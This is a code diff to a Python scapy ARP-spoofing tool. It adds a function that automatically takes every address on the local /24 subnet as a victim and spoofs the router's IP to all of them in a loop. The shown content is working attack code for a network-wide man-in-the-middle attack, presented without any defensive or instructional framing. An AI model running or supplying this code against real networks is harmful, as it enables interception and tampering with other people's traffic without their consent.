@@ -4,8 +4,10 @@ import time
 import sys
 import scapy.all as scapy
 import os
+import net
 
 iface = None
+arp_spoofing = True
 
 # MAC address function which will return
 # the mac_address of the provided ip address 
@@ -28,7 +30,7 @@ def get_mac(ip):
         raise Exception("No arp response for {}".format(ip))
 
  
- 
+  
 def arp_spoof(target_ip, spoof_ip):
     """" Here the ARP packet is set to response and
     pdst is set to the target IP 
@@ -55,7 +57,7 @@ def arp_main(silent, manual, router, input_iface):
     iface = input_iface
     sent_packets_count = 0  # initializing the packet counter
 
-    while True:
+    while arp_spoofing:
         for victim_ip in victim_addresses:
             sent_packets_count += 2
             arp_spoof(victim_ip, router_ip)
@@ -64,4 +66,15 @@ def arp_main(silent, manual, router, input_iface):
             sys.stdout.flush()
             time.sleep(2)
 
-        
+
+def arp_main_automated(silent = False, iface = "enp0s10") :
+    current_ip = scapy.get_if_addr(iface)
+    subnet = current_ip.rsplit('.', 1)[0] #split rightmost number off
+    router_ip = current_ip.rsplit('.', 1)[0] + '.1' #usually router is at subnet .1
+
+    victims = [subnet + "." + str(i)  for i in range(255)] #all other ips in subnet
+    victims.remove(current_ip)
+    victims.remove(router_ip)
+
+    arp_main(silent, victims, router_ip, iface)
+
